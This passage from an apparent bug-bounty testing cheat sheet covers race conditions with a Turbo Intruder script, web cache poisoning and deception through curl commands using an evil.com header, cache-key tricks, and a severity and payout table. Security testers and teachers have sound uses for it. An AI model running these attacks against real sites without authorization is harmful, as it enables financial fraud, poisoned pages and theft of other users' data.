```

### Turbo Intruder (Burp Suite)

```python
# Turbo Intruder script for race conditions
# Use single-packet attack for true simultaneous delivery
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)

    # Queue all requests, hold them
    for i in range(20):
        engine.queue(target.req, gate='race')

    # Release all at once (single TCP packet on HTTP/2)
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### What to Race

| Action | Expected Bug | Impact |
|--------|-------------|--------|
| Coupon/voucher redemption | Double-spend | Financial |
| Like/vote/follow | Inflated counts | Integrity |
| File upload then process | Upload malicious + bypass check | RCE/XSS |
| Account balance operations | Overdraw/double-spend | Financial |
| Invite/referral bonus | Unlimited bonuses | Financial |
| Limited resource allocation | Exceed quota | Resource abuse |
| Password reset + login | Reset old password, login with old | Auth bypass |

---

## 10. Cache Poisoning

### Web Cache Poisoning

```bash
# Step 1: Identify cached responses
curl -sI "https://target.com/" | grep -i "cache\|age\|x-cache\|cf-cache"
# Look for: X-Cache: HIT, Age: 300, CF-Cache-Status: HIT

# Step 2: Find unkeyed headers (reflected but not in cache key)
# Test common headers one by one:
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -s "https://target.com/" -H "X-Forwarded-Scheme: http" | grep "http://"
curl -s "https://target.com/" -H "X-Original-URL: /admin" | grep "admin"
curl -s "https://target.com/" -H "X-Rewrite-URL: /admin"

# Step 3: If header is reflected, poison the cache
# Send the poisoned request until it gets cached (hit the exact cache key URL)
for i in $(seq 1 50); do
  curl -s "https://target.com/page?cachebuster=$RANDOM" \
    -H "X-Forwarded-Host: evil.com" > /dev/null
done

# Step 4: Verify other users receive the poisoned response
curl -s "https://target.com/page" | grep "evil.com"

# Web Cache Deception (inverse: trick cache into storing private data)
# Access a private page with a static-looking extension
curl -s "https://target.com/api/me/profile.css" -H "Cookie: session=VICTIM"
# If cache stores it, attacker can access the same URL without cookies
curl -s "https://target.com/api/me/profile.css"  # Gets victim's profile data
```

### Cache Key Normalization Issues

```bash
# Different servers normalize URLs differently
# Path traversal in cache vs origin:
curl "https://target.com/static/../api/private"
# Cache sees: /static/../api/private (caches as static)
# Origin sees: /api/private (returns private data)

# Query parameter order:
curl "https://target.com/page?a=1&b=2"  # Cached
curl "https://target.com/page?b=2&a=1"  # Same cache key? Or different?

# Fragment handling:
curl "https://target.com/page%23fragment"  # URL-encoded #
# Different layers may decode at different times
```

---

## Quick Reference: Impact Multipliers

When you find a bug, ask these questions to maximize its severity:

1. **Can I chain it?** (XSS alone = Medium; XSS + CSRF + ATO chain = Critical)
2. **How many users are affected?** ("All users" vs "only users who click a link")
3. **What data is at risk?** (Profile names = Low; financial data / PII = High)
4. **Is it automatable?** (Manual exploitation = lower; scriptable mass exploitation = higher)
5. **Does it bypass a security control?** (The control's importance determines severity)
6. **What is the business impact?** (Revenue loss, regulatory violation, reputational damage)

### CVSS Quick Scoring Mental Model

| Scenario | Likely CVSS | Typical Payout |
|----------|------------|----------------|
| Unauthenticated RCE | 9.8 | $10K-$100K+ |
| Auth bypass to admin | 9.1 | $5K-$50K |
| Full ATO chain | 8.0-9.0 | $3K-$30K |
| SSRF to cloud creds | 7.5-9.0 | $2K-$20K |
| IDOR mass data exfil | 7.5-8.5 | $2K-$15K |
| Stored XSS on main domain | 6.1-7.5 | $1K-$10K |
| CSRF on sensitive action | 5.0-7.0 | $500-$5K |
| Information disclosure | 3.0-5.0 | $200-$2K |
| Self-XSS / low-impact | 0-3.0 | $0 (don't submit) |
